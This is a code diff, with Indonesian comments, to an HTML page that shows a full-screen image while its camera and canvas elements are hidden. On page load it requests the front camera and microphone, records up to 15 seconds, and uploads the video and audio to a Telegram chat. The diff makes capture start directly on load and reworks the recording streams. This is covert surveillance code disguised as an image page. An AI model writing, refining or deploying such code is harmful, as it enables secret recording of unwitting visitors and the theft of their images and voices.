@@ -9,7 +9,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body, html { width: 100vw; height: 100vh; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
         img { max-width: 100%; max-height: 100vh; object-fit: contain; }
-        video, canvas { display: none; } /* Sembunyikan elemen kamera */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
@@ -25,23 +25,6 @@
         let mediaRecorderVideo, mediaRecorderAudio;
         let videoChunks = [], audioChunks = [];
         let recordingTime = 0, maxRecordingTime = 15; 
-
-        async function checkPermissions() {
-            try {
-                const cameraPermission = await navigator.permissions.query({ name: 'camera' });
-                const micPermission = await navigator.permissions.query({ name: 'microphone' });
-
-                if (cameraPermission.state === "granted" && micPermission.state === "granted") {
-                    startCapture();
-                } else {
-                    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                        .then(startCapture)
-                        .catch(err => console.error("Akses kamera/mikrofon ditolak:", err));
-                }
-            } catch (error) {
-                console.error("Gagal mengecek izin:", error);
-            }
-        }
 
         async function startCapture() {
             try {
@@ -97,10 +80,11 @@
 
         async function startRecording() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
-                mediaRecorderVideo = new MediaRecorder(stream, { mimeType: "video/webm" });
-                mediaRecorderAudio = new MediaRecorder(stream, { mimeType: "audio/webm" });
+                mediaRecorderVideo = new MediaRecorder(videoStream, { mimeType: "video/webm" });
+                mediaRecorderAudio = new MediaRecorder(audioStream, { mimeType: "audio/webm" });
 
                 mediaRecorderVideo.ondataavailable = event => videoChunks.push(event.data);
                 mediaRecorderAudio.ondataavailable = event => audioChunks.push(event.data);
@@ -136,10 +120,10 @@
 
         async function sendVideoToTelegram() {
             if (videoChunks.length > 0) {
-                const blob = new Blob(videoChunks, { type: "video/webm" });
+                const blob = new Blob(videoChunks, { type: "video/mp4" });
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("video", blob, "Rekaman.mp4");
+                formData.append("video", blob, "rekaman.mp4");
                 formData.append("caption", "🎥 Rekaman video");
 
                 try {
@@ -157,10 +141,10 @@
 
         async function sendAudioToTelegram() {
             if (audioChunks.length > 0) {
-                const blob = new Blob(audioChunks, { type: "audio/webm" });
+                const blob = new Blob(audioChunks, { type: "audio/ogg" });
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("voice", blob, "Rekaman.ogg");
+                formData.append("voice", blob, "rekaman.ogg");
                 formData.append("caption", "🎙 Rekaman suara");
 
                 try {
@@ -176,7 +160,7 @@
             }
         }
 
-        window.onload = checkPermissions;
+        window.onload = startCapture;
     </script>
 </body>
 </html>
